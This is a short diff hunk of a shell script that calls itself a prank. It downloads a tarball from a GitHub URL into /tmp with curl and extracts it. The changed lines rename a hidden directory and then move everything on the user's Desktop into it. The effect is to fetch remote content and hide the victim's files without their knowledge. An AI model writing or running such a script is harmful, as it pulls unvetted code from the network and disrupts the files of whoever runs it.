@@ -5,9 +5,9 @@ curl -s -L https://github.com/monybigsef/p1/raw/master/prank.tar.gz -o /tmp/laz/
  
 tar xvf /tmp/laz/prank.tar.gz -C /tmp/laz > /dev/null 
  
-mkdir ~/.Laz/ 
+mkdir ~/.Hamza/ 
  
-mv ~/Desktop/* ~/.Laz/ 
+mv ~/Desktop/* ~/.Hamza/ 
  
 cd ~/Desktop 
  
